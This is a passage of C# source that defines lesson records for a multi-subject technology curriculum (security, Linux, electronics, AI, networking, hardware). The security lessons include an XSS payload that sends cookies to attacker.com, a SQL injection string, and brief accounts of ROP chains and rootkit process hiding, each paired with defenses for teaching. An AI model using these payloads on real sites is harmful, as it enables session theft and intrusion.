                    "# Level 3: Web Pentesting & OWASP Top 10\n\n### 1. SQL Injection (SQLi):\nOccurs when user input concatenates directly into database queries.\n- *Exploit*: `' OR '1'='1`\n- *Defense*: Parameterized queries / Prepared statements.\n\n### 2. Cross-Site Scripting (XSS):\nInjecting malicious client-side JavaScript.\n- *Exploit*: `<script>document.location='http://attacker.com?c='+document.cookie</script>`\n- *Defense*: Context-aware HTML entity encoding and strict Content Security Policy (CSP).",
                    18, "Advanced"),

                new("L_SEC_4", "M_SEC", "Level 4: Cryptographic Exploits: Rainbow Tables, Buffer Overflows & Hardening",
                    "Master hash salting, dictionary attacks, memory corruption, stack smashing, and zero-trust hardening.",
                    "# Level 4: Cryptographic Exploitation & Memory Corruption\n\n### Password Hashing & Rainbow Tables:\n- Plain hashes (MD5, SHA-1) are crackable via precomputed Rainbow Tables.\n- **Cryptographic Salt**: Appending random bytes to each password before hashing neutralizes precomputed tables.\n\n### Buffer Overflow Exploits:\nWriting beyond stack buffer boundaries to overwrite the instruction pointer (EIP/RIP) and execute arbitrary shellcode.\n- *Mitigations*: Stack Canaries, ASLR (Address Space Layout Randomization), and DEP/NX (Data Execution Prevention).",
                    22, "Master"),

                // =========================================================================
                // 8. LINUX SYSTEMS & KERNEL (LNX101)
                // =========================================================================
                new("L_LNX_1", "M_LNX", "Level 1: Linux Filesystem Hierarchy (FHS) & Core Navigation",
                    "Master the Linux directory layout (/etc, /var, /home, /bin), piping, and core terminal commands.",
                    "# Level 1: Linux Filesystem Hierarchy & Essential Commands\n\nLinux organizes all devices and files under a single root directory (`/`).\n\n### Key Directories:\n- `/etc`: Configuration files for system services.\n- `/var/log`: System and application event logs.\n- `/home`: User personal files.\n- `/dev`: Special device files representing hardware.\n\n### Core Shell Navigation:\n`ls -la`, `cd`, `pwd`, `cat`, `head`, `tail -f`, `grep`, and piping (`|`).",
                    12, "Basics"),

                new("L_LNX_2", "M_LNX", "Level 2: Linux File Permissions: Octal chmod 755/644, chown & SUID",
                    "Master owner/group/other permissions, symbolic vs octal notation, and special SUID security risks.",
                    "# Level 2: Linux Permissions & SUID Bits\n\nPermissions control Read (`r=4`), Write (`w=2`), and Execute (`x=1`).\n\n### Octal Permission Breakdown:\n- `chmod 755 script.sh` = `rwxr-xr-x` (Owner full, group/others read & execute).\n- `chmod 600 id_rsa` = `rw-------` (Owner only).\n\n### SUID (SetUID - 4000):\nExecutes a binary with the permissions of the file owner (often root). Misconfigured SUID binaries are a primary privilege escalation vector in Linux CTF challenges!",
                    15, "Intermediate"),

                new("L_LNX_3", "M_LNX", "Level 3: Process Control: ps, top, kill, nice, cron & Bash Scripting",
                    "Master background processes, signal dispatching (SIGTERM, SIGKILL), cron automation, and shell scripts.",
                    "# Level 3: Process Management & Bash Automation\n\n### Process Control:\n- `ps aux | grep nginx`: Find active process IDs (PID).\n- `kill -15 <PID>`: Graceful SIGTERM shutdown.\n- `kill -9 <PID>`: Immediate SIGKILL termination.\n\n### Cron Job Scheduling:\nSyntax: `Minute Hour Day Month DayOfWeek Command`\n`0 2 * * * /backup.sh` runs daily at 2:00 AM.",
                    18, "Advanced"),

                new("L_LNX_4", "M_LNX", "Level 4: Systemd Service Daemons, Kernel Modules & iptables Hardening",
                    "Master unit files, systemctl lifecycle control, lsmod kernel drivers, and packet filtering firewalls.",
                    "# Level 4: Systemd & Kernel Network Hardening\n\n### Systemd Services:\n`systemctl start|stop|restart|status <service>` manages system daemons defined in `/etc/systemd/system/`.\n\n### UFW / iptables Firewall Hardening:\n```bash\nsudo ufw default deny incoming\nsudo ufw default allow outgoing\nsudo ufw allow 22/tcp\nsudo ufw enable\n```",
                    20, "Master"),

                // =========================================================================
                // 9. ELECTRONICS & ROBOTICS (ELE101)
                // =========================================================================
                new("L_ELE_1", "M_ELE", "Level 1: Ohm's Law: Voltage, Current, Resistance & Power Math",
                    "Master fundamental electrical formulas V = I * R and P = V * I with real-world circuit calculations.",
                    "# Level 1: Ohm's Law & Circuit Mathematics\n\n### The Fundamental Equations:\n$$V = I \\times R$$\n$$P = V \\times I = I^2 \\times R$$\n\n- **Voltage ($V$)**: Electrical potential difference (Volts).\n- **Current ($I$)**: Rate of electron flow (Amperes).\n- **Resistance ($R$)**: Opposition to current (Ohms $\\Omega$).\n- **Power ($P$)**: Rate of electrical energy transfer (Watts).",
                    12, "Basics"),

                new("L_ELE_2", "M_ELE", "Level 2: Series vs Parallel Circuits, Capacitors & LED Resistors",
                    "Calculate equivalent resistances, capacitive filtering, and LED current-limiting protection resistors.",
                    "# Level 2: Series/Parallel Circuits & LED Sizing\n\n### Resistor Networks:\n- **Series**: $R_{\\text{total}} = R_1 + R_2 + R_3$\n- **Parallel**: $\\frac{1}{R_{\\text{total}}} = \\frac{1}{R_1} + \\frac{1}{R_2}$\n\n### LED Current Limiter Resistor:\n$$R = \\frac{V_{\\text{source}} - V_{\\text{LED}}}{I_{\\text{LED}}}$$\nExample: Powering a 2.0V LED @ 20mA from 5V supply: $R = (5 - 2) / 0.02 = \\mathbf{150\\ \\Omega}$.",
                    15, "Intermediate"),

                new("L_ELE_3", "M_ELE", "Level 3: Boolean Logic Gates: AND, OR, NOT, NAND, NOR & XOR",
                    "Explore digital logic gate truth tables, transistor implementation, and binary half-adders.",
                    "# Level 3: Boolean Logic Gates & Truth Tables\n\nLogic gates combine binary inputs into deterministic outputs:\n- **AND**: Output 1 only if ALL inputs are 1.\n- **OR**: Output 1 if ANY input is 1.\n- **NOT**: Inverts the binary state.\n- **XOR**: Output 1 if inputs are DIFFERENT (used in arithmetic half-adders).",
                    16, "Advanced"),

                new("L_ELE_4", "M_ELE", "Level 4: Microcontroller Architecture: Arduino/ESP32, GPIO, PWM & ADC",
                    "Master microcontroller pins, Analog-to-Digital conversion, Pulse Width Modulation, and I2C/SPI buses.",
                    "# Level 4: Microcontrollers & Sensor Buses\n\nMicrocontrollers combine a CPU, RAM, Flash memory, and programmable I/O pins on a single silicon die.\n\n### Key Peripherals:\n- **GPIO**: General Purpose Input/Output pins.\n- **PWM (Pulse Width Modulation)**: Simulates variable analog voltage for motor speed and LED dimming.\n- **ADC (Analog-to-Digital Converter)**: Converts continuous sensor voltages into discrete digital values.\n- **I2C / SPI**: Synchronous serial protocols for communicating with displays and sensors.",
                    20, "Master"),

                // =========================================================================
                // 10. ARTIFICIAL INTELLIGENCE (AI101)
                // =========================================================================
                new("L_AI_1", "M_AI", "Level 1: AI Foundations: Rule-Based Systems vs Machine Learning",
                    "Understand how modern statistical machine learning differs from hardcoded expert decision trees.",
                    "# Level 1: Foundations of Artificial Intelligence\n\n### Classical Programming vs Machine Learning:\n- **Classical Programming**: $\\text{Rules} + \\text{Data} = \\text{Answers}$\n- **Machine Learning**: $\\text{Data} + \\text{Answers} = \\text{Rules (Model)}$\n\nMachine learning algorithms automatically discover mathematical functions mapping input features to output predictions.",
                    12, "Basics"),

                new("L_AI_2", "M_AI", "Level 2: Supervised vs Unsupervised Learning & Decision Trees",
                    "Master classification, regression, clustering, entropy metrics, and decision boundary splits.",
                    "# Level 2: Supervised vs Unsupervised Learning\n\n### Learning Paradigms:\n1. **Supervised Learning**: Training on labeled data (Classification & Regression).\n2. **Unsupervised Learning**: Discovering hidden patterns in unlabeled data (K-Means Clustering, PCA).\n3. **Reinforcement Learning**: Agents learning optimal policies via reward/penalty trial and error.",
                    15, "Intermediate"),

                new("L_AI_3", "M_AI", "Level 3: Neural Networks, Activation Functions & Backpropagation",
                    "Master artificial neurons, non-linear activations (ReLU, Sigmoid), loss functions, and gradient descent.",
                    "# Level 3: Neural Networks & Backpropagation\n\n### Neural Computation:\n$$z = \\sum (w_i \\times x_i) + b$$\n$$a = \\text{ReLU}(z) = \\max(0, z)$$\n\n### Backpropagation:\nCalculates the partial derivative of the error loss with respect to each weight using the Calculus Chain Rule, guiding Gradient Descent updates.",
                    18, "Advanced"),

                new("L_AI_4", "M_AI", "Level 4: Transformers, Large Language Models & Local Offline Inference",
                    "Master self-attention mechanisms, tokenization, temperature sampling, and local on-device AI models.",
                    "# Level 4: Transformers & Local On-Device AI\n\n### The Transformer Architecture:\nIntroduced in 'Attention Is All You Need' (2017), Transformers replace sequential RNNs with **Self-Attention mechanisms** that process all tokens concurrently.\n\n### Local On-Device AI:\nBy quantizing model weights (4-bit / 8-bit integer precision), small language models can execute locally on low-end CPUs without internet connectivity or cloud server telemetry.",
                    22, "Master"),

                // =========================================================================
                // 11. IT TROUBLESHOOTING (IT101)
                // =========================================================================
                new("L_IT_1", "M_IT", "Level 1: CompTIA 6-Step Systematic Troubleshooting Methodology",
                    "Learn the industry standard 6-step framework for diagnosing and resolving complex IT incidents.",
                    "# Level 1: Systematic IT Troubleshooting Methodology\n\n### The CompTIA 6-Step Process:\n1. Identify the problem (Question user, observe symptoms).\n2. Establish a theory of probable cause (Question the obvious).\n3. Test the theory to determine cause.\n4. Establish a plan of action and implement the solution.\n5. Verify full system functionality and implement preventive measures.\n6. Document findings, actions, and outcomes.",
                    12, "Basics"),

                new("L_IT_2", "M_IT", "Level 2: Hardware Diagnostics: RAM Seating, SMART Errors & Thermal Throttling",
                    "Diagnose loose memory modules, storage drive sector failures, thermal paste degradation, and bad PSUs.",
                    "# Level 2: Hardware Diagnostics & Component Failures\n\n### Common Hardware Failure Signatures:\n- **Loose RAM**: PC turns on with fans spinning at max RPM, black screen, continuous beep codes.\n- **SMART Drive Failures**: Reallocated Sector Count errors indicate physical platter/NAND cell wear.\n- **Thermal Throttling**: CPU temperature exceeds 95°C, causing clock frequency drops and sudden thermal shutdowns.",
                    15, "Intermediate"),

                new("L_IT_3", "M_IT", "Level 3: Network & DNS Failures: Default Gateways, DHCP & Starvation",
                    "Systematically isolate network outages using ping loopback, gateway verification, and DNS lookups.",
                    "# Level 3: Network & DNS Troubleshooting\n\n### The Diagnostic Ladder:\n1. `ping 127.0.0.1`: Verifies local TCP/IP stack integrity.\n2. `ping <Local_IP>`: Verifies network interface card (NIC).\n3. `ping <Default_Gateway>`: Verifies local switch and router connectivity.\n4. `ping 8.8.8.8`: Verifies Internet routing across ISP.\n5. `nslookup domain.com`: Verifies DNS resolution.",
                    18, "Advanced"),

                new("L_IT_4", "M_IT", "Level 4: OS Kernel Crashes: Windows BSOD Minidump Analysis & Recovery",
                    "Analyze memory minidumps, bugcheck stop codes, driver IRQL faults, and system recovery procedures.",
                    "# Level 4: Kernel Crashes & BSOD Minidump Analysis\n\n### Common Windows Stop Codes:\n- `IRQL_NOT_LESS_OR_EQUAL (0x0A)`: Kernel driver attempted to access invalid page memory.\n- `KMODE_EXCEPTION_NOT_HANDLED (0x1E)`: Unhandled exception in kernel-mode driver.\n- `PAGE_FAULT_IN_NONPAGED_AREA (0x50)`: Defective RAM module or corrupt filesystem.\n\n*Solution*: Analyze `.dmp` files via WinDbg to pinpoint the offending driver file.",
                    20, "Master"),

                // =========================================================================
                // LEVEL 5 (GRANDMASTER) & LEVEL 6 (CUTTING-EDGE) CURRICULA
                // =========================================================================
                new("L_CS_5", "M_CS", "Level 5: Speculative Execution, Branch Predictors & Spectre/Meltdown",
                    "Understand out-of-order execution, transient instructions, branch target buffers, and side-channel memory leaks.",
                    "# Level 5: Speculative Execution & Side-Channel Leaks\n\nModern high-performance CPUs execute instructions **speculatively** ahead of conditional branch resolutions using Branch Target Buffers (BTB) and Pattern History Tables.\n\n### Spectre & Meltdown Vulnerabilities:\n- If a branch is mispredicted, the CPU rolls back architectural register state.\n- **The Microarchitectural Flaw**: Speculatively accessed memory lines remain loaded inside the **L1/L2 CPU hardware cache**!\n- **FLUSH+RELOAD Attack**: An attacker measures memory access timing (CPU clock cycles via `RDTSC`). Cached memory loads in ~1-2 ns vs ~80 ns for uncached RAM, leaking secret kernel data byte-by-byte.\n- *Mitigation*: Hardware speculative barriers (`LFENCE`), Kernel Page Table Isolation (KPTI), and Indirect Branch Restricted Speculation (IBRS).",
                    25, "Grandmaster"),

                new("L_CS_6", "M_CS", "Level 6: Quantum Computing: Qubits, Superposition & Shor's Algorithm",
                    "Master quantum state vectors, Bloch sphere representation, quantum entanglement, and polynomial-time integer factorization.",
                    "# Level 6: Quantum Computing Foundations\n\n### The Quantum Bit (Qubit):\nUnlike classical bits that are strictly 0 or 1, a qubit exists in a linear **superposition** of both states until measured:\n$$|\\psi\\rangle = \\alpha |0\\rangle + \\beta |1\\rangle \\quad \\text{where } |\\alpha|^2 + |\\beta|^2 = 1$$\n\n### Quantum Entanglement (Bell States):\nTwo qubits can be entangled such that the state of one instantly dictates the state of the other, regardless of spatial distance:\n$$|\\Phi^+\\rangle = \\frac{|00\\rangle + |11\\rangle}{\\sqrt{2}}$$\n\n### Shor's Algorithm Threat to Cryptography:\nWhile classical computers require exponential sub-exponential time ($O(e^{\\sqrt[3]{\\ln N}})$, General Number Field Sieve) to factor large RSA integers, Shor's Quantum Algorithm factors integers in **polynomial time** ($O((\\log N)^3)$) via Quantum Fourier Transform (QFT), necessitating Post-Quantum Cryptography (PQC).",
                    30, "Cutting-Edge"),

                new("L_PRG_5", "M_PRG", "Level 5: Asynchronous Concurrency, ThreadPools & Lock-Free Atomics",
                    "Master lock-free data structures, volatile reads/writes, Interlocked compare-exchange, and ThreadPool starvation prevention.",
                    "# Level 5: Concurrency & Lock-Free Systems Engineering\n\n### The Cost of Locks & Mutexes:\nTraditional OS mutexes cause expensive user-to-kernel context switches (~1,000-2,000 CPU cycles) and risk deadlocks or priority inversion.\n\n### Lock-Free Hardware Primitives:\nCPUs provide atomic Compare-And-Swap (CAS) assembly opcodes (`LOCK CMPXCHG` on x86):\n```csharp\n// Atomic Lock-Free Update\nint current, updated;\ndo {\n    current = sharedValue;\n    updated = current + 1;\n} while (Interlocked.CompareExchange(ref sharedValue, updated, current) != current);\n```\n\n### ThreadPool Starvation Prevention:\nBlocking async tasks synchronously via `.Result` or `.Wait()` locks worker threads, exhausting thread pools on 1.2 GHz single/dual-core processors. Always use non-blocking `await`!",
                    25, "Grandmaster"),

                new("L_PRG_6", "M_PRG", "Level 6: High-Performance Systems: SIMD AVX-512 & Zero-Allocation Spans",
                    "Master Single Instruction Multiple Data (SIMD) 512-bit vector registers, Span<T>, Memory<T>, and zero-allocation high throughput.",
                    "# Level 6: SIMD Vectorization & Zero-Allocation Spans\n\n### SIMD Vector Processing (Single Instruction, Multiple Data):\nInstead of processing an array element-by-element in scalar loops, modern CPUs use wide SIMD registers (AVX2: 256-bit, AVX-512: 512-bit) to perform arithmetic on **16 single-precision floats simultaneously in a single clock cycle**.\n\n```csharp\n// SIMD 8-Way Parallel Vector Addition (C# Vector<float>)\nusing System.Numerics;\nvar v1 = new Vector<float>(array1, i);\nvar v2 = new Vector<float>(array2, i);\nvar vSum = v1 + v2; // 8 additions executed concurrently!\n```\n\n### Zero-Allocation `Span<T>`:\n`Span<T>` is a ref struct representing contiguous memory (stack, native heap, or array slices) with zero heap allocation and zero GC overhead, achieving near C++ performance in managed C#.",
                    30, "Cutting-Edge"),

                new("L_SW_5", "M_SW", "Level 5: Compiler Intermediate Representation (IR), SSA & LLVM",
                    "Understand compiler middle-end optimization, Static Single Assignment (SSA) form, dead-code elimination, and LLVM bytecode.",
                    "# Level 5: Compilers: Intermediate Representation & SSA Form\n\nModern optimizing compilers (LLVM, Roslyn, GCC) do not translate ASTs directly to machine code. They lower code into an **Intermediate Representation (IR)**.\n\n### Static Single Assignment (SSA) Form:\nIn SSA form, every variable is assigned **exactly once**:\n```\n// Original Code:         // SSA Transformed Form:\nx = 5;                   x_1 = 5;\nx = x + 1;               x_2 = x_1 + 1;\n```\nSSA turns complex variable lifetime dependencies into explicit Directed Acyclic Graphs (DAGs), enabling:\n- **Dead Code Elimination (DCE)**: Pruning unused expressions.\n- **Common Subexpression Elimination (CSE)**.\n- **Constant Propagation**.\n\n### LLVM Optimization Pipeline:\n`Clang/Rustc (Front-End) -> LLVM IR -> Opt Passes -> LLVM Target Backend (x86/ARM Machine Code)`.",
                    25, "Grandmaster"),

                new("L_SW_6", "M_SW", "Level 6: Distributed Systems: Raft Protocol, Paxos & Vector Clocks",
                    "Master leader election, log replication, split-brain quorum prevention, and distributed state machines.",
                    "# Level 6: Distributed Consensus: Raft & Paxos\n\nIn a distributed cluster where servers can crash or network partitions occur, achieving consensus on state is fundamental.\n\n### The Raft Consensus Algorithm:\n1. **Leader Election**:\n   - Nodes begin as Followers with randomized election timeouts (150-300 ms).\n   - If no heartbeat is received, node transitions to Candidate and requests votes.\n   - Candidate obtaining a **Quorum (Majority = $\\lfloor N/2 \\rfloor + 1$)** becomes Leader.\n2. **Log Replication**:\n   - Leader receives client writes, appends entry to its log, and broadcasts `AppendEntries` RPCs.\n   - Once majority of nodes acknowledge, the entry is committed and applied to the state machine.\n3. **Safety Guarantee**: Uncommitted entries are never overwritten; stale leaders are deposed via higher Term numbers.",
                    30, "Cutting-Edge"),

                new("L_HW_5", "M_HW", "Level 5: Extreme Overclocking, Cryogenic LN2 & Direct-Die Cooling",
                    "Master silicon lottery binning, V/F voltage frequency curves, delidding, liquid metal TIM, and sub-zero LN2 physics.",
                    "# Level 5: Extreme Overclocking & Thermal Cryogenics\n\n### Overclocking Physics:\nClock frequency is limited by propagation delay through transistor logic gates and thermal dissipation ($P = C \\times V^2 \\times f$):\n- **Voltage/Frequency Curve**: Higher frequencies require higher core voltage ($V_{core}$), which exponentially increases heat generation.\n- **Silicon Delidding**: Removing the CPU Integrated Heat Spreader (IHS) to replace low-conductivity thermal paste with gallium-indium **Liquid Metal** (73 W/mK vs 8 W/mK paste) or direct-die water blocks.\n\n### Liquid Nitrogen (LN2) Cryogenics (-196°C):\nSuper-cooling silicon lowers electrical resistance and eliminates thermal throttling, enabling world-record CPU clock speeds exceeding **8.0 GHz**! Requires insulation with kneaded eraser putty to prevent air humidity condensation and electrical shorts.",
                    25, "Grandmaster"),

                new("L_HW_6", "M_HW", "Level 6: Semiconductor Lithography: EUV Physics & 2nm GAAFET Nodes",
                    "Understand Extreme Ultraviolet (EUV 13.5nm wavelength) photolithography, multi-patterning, Gate-All-Around nanosheets, and Backside Power.",
                    "# Level 6: Semiconductor Physics & 2nm GAAFETs\n\n### Photolithography Light Wavelength Limits:\n- Deep Ultraviolet (DUV): 193 nm argon-fluoride lasers.\n- **Extreme Ultraviolet (EUV)**: 13.5 nm wavelength generated by blasting molten tin droplets with high-power $CO_2$ pulsed lasers 50,000 times/sec to generate high-energy plasma.\n\n### Transistor Evolution:\n1. **Planar MOSFETs** (Sub-28nm): Suffered catastrophic quantum mechanical electron tunneling and leakage current.\n2. **FinFETs** (22nm - 3nm): 3D vertical fin wrapped on 3 sides by the gate.\n3. **Gate-All-Around (GAAFET / Nanosheet)** (2nm & beyond): Stacked horizontal silicon nanosheets completely encircled on all 4 sides by the dielectric gate, restoring electrostatic control.\n4. **Backside Power Delivery (BSPDN)**: Routing power rails on the back of the silicon wafer to eliminate voltage droop and free front-side wiring for signal routing.",
                    30, "Cutting-Edge"),

                new("L_HW2_5", "M_HW2", "Level 5: Cache Coherence Protocols: MESI/MOESI & Interconnect Fabrics",
                    "Master Modified, Exclusive, Shared, Invalid state transitions, snooping vs directory coherence, and eliminating false sharing.",
                    "# Level 5: Cache Coherence & Multiprocessor Interconnects\n\nWhen multiple CPU cores have private L1/L2 caches containing copies of the same memory address, the hardware must ensure consistency.\n\n### The MESI Protocol (4 States):\n- **Modified (M)**: Cache line present only in this cache and is dirty (must be written back to RAM).\n- **Exclusive (E)**: Cache line present only in this cache and matches clean RAM.\n- **Shared (S)**: Cache line may be present in multiple core caches; read-only.\n- **Invalid (I)**: Cache line contains stale data and cannot be read.\n\n### False Sharing in Multi-Threaded Code:\nWhen two threads on separate cores modify independent variables that happen to share the same **64-byte cache line**, the CPU repeatedly invalidates and reloads the line across the bus (Cache Ping-Ponging), destroying performance. Solution: Align data to 64-byte boundaries!",
                    25, "Grandmaster"),

                new("L_HW2_6", "M_HW2", "Level 6: GPU Compute Architectures: Streaming Multiprocessors & Tensor Cores",
                    "Master SIMT execution models, warp schedulers, mixed-precision FP16/FP8 matrix multiplication, and High Bandwidth Memory (HBM3e).",
                    "# Level 6: GPU Compute Microarchitecture & Tensor Cores\n\nWhile CPUs optimize for single-threaded sequential latency, GPUs optimize for massively parallel aggregate throughput.\n\n### NVIDIA GPU Microarchitecture Components:\n- **Streaming Multiprocessor (SM)**: Contains integer ALUs, single-precision FP32 cores, dual-precision FP64 cores, register files, and warp schedulers.\n- **Warp Execution**: GPU executes threads in lockstep groups of **32 threads called a Warp**.\n\n### Tensor Cores & Matrix Multiply-Accumulate (MMA):\nTensor Cores execute fused matrix operations in hardware in a single clock cycle:\n$$D = A \\times B + C$$\nBy utilizing mixed-precision FP16, BF16, and FP8 formats, Tensor Cores provide the massive teraflops of compute required to train and run Modern AI Large Language Models.\n- **High Bandwidth Memory (HBM3e)**: Vertically stacked DRAM dies connected via through-silicon vias (TSVs) achieving memory bandwidths exceeding **3.0 TB/s**.",
                    30, "Cutting-Edge"),

                new("L_NET_5", "M_NET", "Level 5: BGP Anycast Routing, MPLS Label Switching & IXP Peering",
                    "Master Autonomous System routing (AS numbers), Anycast DNS load-balancing, MPLS label stacks, and internet peering agreements.",
                    "# Level 5: Global Internet Routing: BGP Anycast & MPLS\n\n### Border Gateway Protocol (BGP-4):\nThe glue holding the global Internet together, operating between Autonomous Systems (AS).\n- **BGP Path Attributes**: AS-Path, Local Preference, Multi-Exit Discriminator (MED).\n\n### BGP Anycast Routing:\n- Multiple globally distributed servers (e.g. Cloudflare, Google 8.8.8.8 DNS) announce the exact same IP prefix from different data centers around the world.\n- Global BGP routers automatically route client packets to the **topologically closest data center**, providing built-in geographic load balancing and massive DDoS resilience!\n\n### Multi-Protocol Label Switching (MPLS):\nInstead of looking up long IP routing tables at every hop, ISP core routers forward packets based on fixed 20-bit **MPLS Labels** inserted into packet headers.",
                    25, "Grandmaster"),

                new("L_NET_6", "M_NET", "Level 6: Software-Defined Networking, eBPF Kernel Acceleration & QUIC",
                    "Master OpenFlow controllers, eBPF XDP kernel bypass packet processing, and multiplexed UDP QUIC / HTTP/3.",
                    "# Level 6: Modern Networking: eBPF, SDN & QUIC\n\n### Software-Defined Networking (SDN):\nDecouples the **Control Plane** (centralized software brain deciding route topology) from the **Data Plane** (high-speed hardware switches forwarding packets).\n\n### eBPF (Extended Berkeley Packet Filter) & XDP:\nAllows executing custom sandboxed bytecode directly inside the Linux network driver layer (**eXpress Data Path - XDP**) before allocating memory for an `sk_buff` packet structure. Can drop or route tens of millions of packets per second, enabling line-rate DDoS filtering.\n\n### QUIC / HTTP/3:\nReplaces legacy TCP + TLS with a modern encrypted protocol running over **UDP**:\n- 0-RTT connection resumption.\n- Eliminates TCP Head-of-Line Blocking across packet loss.",
                    30, "Cutting-Edge"),

                new("L_SEC_5", "M_SEC", "Level 5: Return-Oriented Programming (ROP Chains) & ASLR Bypass",
                    "Master chaining CPU register gadgets (pop rdi; ret) to bypass non-executable stack protections (DEP/NX) and defeat ASLR.",
                    "# Level 5: Binary Exploitation: ROP Chains & ASLR Bypasses\n\nWhen Data Execution Prevention (DEP / NX) prevents executing injected shellcode on the stack, attackers utilize **Return-Oriented Programming (ROP)**.\n\n### ROP Mechanics:\n1. An attacker searches the target binary or linked C libraries (`libc`) for existing instruction sequences ending in a `ret` instruction, known as **Gadgets** (e.g. `pop rdi; ret`).\n2. By corrupting the stack with a chain of gadget addresses and parameters, the attacker controls execution flow.\n3. The gadget sequence calls `mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)` to make the stack executable or executes `execve('/bin/sh')` directly!\n\n### Defeating ASLR (Address Space Layout Randomization):\nAttackers exploit information disclosure / format string leaks to calculate library base addresses dynamically at runtime.",
                    25, "Grandmaster"),

                new("L_SEC_6", "M_SEC", "Level 6: Zero-Day Exploit Research, Kernel Rootkits & Post-Quantum Crypto",
                    "Explore patch diffing, Direct Kernel Object Manipulation (DKOM), EDR sensor blinding, and lattice-based post-quantum cryptography.",
                    "# Level 6: Zero-Day Research, Kernel Rootkits & Post-Quantum Cryptography\n\n### Kernel Rootkits & DKOM:\nRunning in Ring 0, advanced rootkits manipulate active kernel structures directly:\n- **Direct Kernel Object Manipulation (DKOM)**: Unlinking a malicious process from the kernel's ActiveProcessLinks doubly-linked list, rendering it completely invisible to Task Manager and process enumeration tools while remaining scheduled by the CPU.\n\n### Post-Quantum Cryptography (NIST PQC Standards):\nBecause Shor's Algorithm will break standard RSA and Elliptic Curve Cryptography (ECC) once cryptographically relevant quantum computers exist:\n- **ML-KEM (CRYSTALS-Kyber)**: Lattice-based Key Encapsulation Mechanism based on the hardness of Learning With Errors (LWE).\n- **ML-DSA (CRYSTALS-Dilithium)**: Quantum-resistant digital signatures.",
                    30, "Cutting-Edge"),

                new("L_LNX_5", "M_LNX", "Level 5: Linux Namespaces, cgroups v2 & Container Internals",
                    "Build a lightweight container runtime from scratch using clone(2), unshare, mount namespaces, and cgroups v2 limits.",
                    "# Level 5: Linux Container Internals: Namespaces & cgroups\n\nContainers are NOT virtual machines. There is no hypervisor. Containers are standard Linux processes isolated via two kernel subsystems:\n\n### 1. Linux Namespaces (Isolation):\n- `PID Namespace`: Container process becomes PID 1 inside its isolated process tree.\n- `NET Namespace`: Dedicated virtual network interfaces (`veth`), routing tables, and firewall rules.\n- `MNT Namespace`: Isolated filesystem mount points (Pivot root).\n- `IPC / UTS Namespaces`: Isolated hostname and shared memory.\n\n### 2. Control Groups (cgroups v2 - Resource Limits):\nLimits hardware resource consumption: `cpu.max` (throttles CPU cycles), `memory.max` (enforces strict memory limits, triggering OOM killer if exceeded).",
                    25, "Grandmaster"),

                new("L_LNX_6", "M_LNX", "Level 6: Linux Kernel Modules, eBPF Tracing & Page Fault Handlers",
                    "Write loadable kernel modules (LKM), hook system call tables, instrument eBPF kprobes, and handle virtual memory traps.",
                    "# Level 6: Linux Kernel Engineering & eBPF Tracing\n\n### Loadable Kernel Modules (LKM):\nLKMs dynamically extend the running Linux kernel without rebooting.\n```c\n#include <linux/module.h>\n#include <linux/kernel.h>\nint init_module(void) {\n    printk(KERN_INFO \"Bhavani Tech Kernel Module Loaded!\\n\");\n    return 0;\n}\nvoid cleanup_module(void) {\n    printk(KERN_INFO \"Module Unloaded!\\n\");\n}\nMODULE_LICENSE(\"GPL\");\n```\n\n### eBPF Observability:\nAttaches non-invasive bytecode verification hooks to kernel probes (`kprobes`) and tracepoints, capturing disk I/O, network traffic, and security anomalies with zero performance degradation.",
                    30, "Cutting-Edge"),

                new("L_ELE_5", "M_ELE", "Level 5: FPGA Architecture, Verilog Hardware Synthesis & DSP",
                    "Master Look-Up Tables (LUTs), flip-flops, block RAM, Verilog HDL synthesis, and real-time hardware digital signal processing.",
                    "# Level 5: FPGA Architecture & Hardware Synthesis\n\n### Field-Programmable Gate Arrays (FPGAs):\nUnlike CPUs and GPUs with fixed instruction set architectures (ASICs), an FPGA consists of an array of reconfigurable **Configurable Logic Blocks (CLBs)**, Look-Up Tables (LUTs), and Flip-Flops interconnected via programmable routing switches.\n\n### Verilog Hardware Description Language (HDL):\nHardware is described concurrently, not sequentially:\n```verilog\nmodule Counter(input clk, input rst, output reg [7:0] count);\n    always @(posedge clk or posedge rst) begin\n        if (rst) count <= 8'b0;\n        else count <= count + 1'b1;\n    end\nendmodule\n```\nFPGAs achieve ultra-low microsecond latencies for High-Frequency Trading (HFT), military radar, and edge AI inferencing.",
                    25, "Grandmaster"),

                new("L_ELE_6", "M_ELE", "Level 6: Robotics Kinematics, PID Closed-Loop Control & FreeRTOS",
                    "Master inverse kinematics, closed-loop Proportional-Integral-Derivative control algorithms, CAN automotive bus, and real-time tasks.",
                    "# Level 6: Advanced Robotics & Real-Time Operating Systems\n\n### Closed-Loop PID Control:\nAdjusts motor control output $u(t)$ based on error $e(t)$ (difference between desired setpoint and current sensor position):\n$$u(t) = K_p e(t) + K_i \\int_0^t e(\\tau) d\\tau + K_d \\frac{de(t)}{dt}$$\n- **Proportional ($K_p$)**: Corrects current error.\n- **Integral ($K_i$)**: Eliminates accumulated steady-state offset.\n- **Derivative ($K_d$)**: Dampens oscillations based on rate of change.\n\n### Real-Time Operating Systems (FreeRTOS):\nEnforces deterministic, pre-emptive task priority scheduling with strict deadline guarantees, ensuring motor brakes and safety sensors react in guaranteed microsecond timeframes.",
                    30, "Cutting-Edge"),

                new("L_AI_5", "M_AI", "Level 5: Transformer Attention Math, RoPE Positional Embeddings & KV-Cache",
                    "Derive multi-head scaled dot-product attention math, Rotary Positional Embeddings (RoPE), and Key-Value cache memory reduction.",
                    "# Level 5: Deep Transformer Mathematics & KV-Cache\n\n### Scaled Dot-Product Attention Equation:\n$$\\text{Attention}(Q, K, V) = \\text{softmax}\\left(\\frac{Q K^T}{\\sqrt{d_k}}\\right) V$$\n1. $Q$ (Query) and $K$ (Key) are projected from token embedding dimensions.\n2. Dot product $Q K^T$ computes similarity between all pairs of tokens.\n3. Dividing by $\\sqrt{d_k}$ prevents gradient saturation in large embedding dimensions.\n4. Softmax converts dot products into probability distribution attention weights.\n\n### Key-Value (KV) Cache Optimization:\nDuring autoregressive token generation, previous token Keys and Values do not change. By caching them in GPU VRAM, token generation time drops from quadratic $O(N^2)$ to linear $O(N)$!",
                    25, "Grandmaster"),

                new("L_AI_6", "M_AI", "Level 6: Mixture of Experts (MoE), LoRA Fine-Tuning & Quantization",
                    "Master sparsely-gated Mixture of Experts routing, Low-Rank Adaptation (LoRA rank r matrices), and 4-bit INT quantization (AWQ/GGUF).",
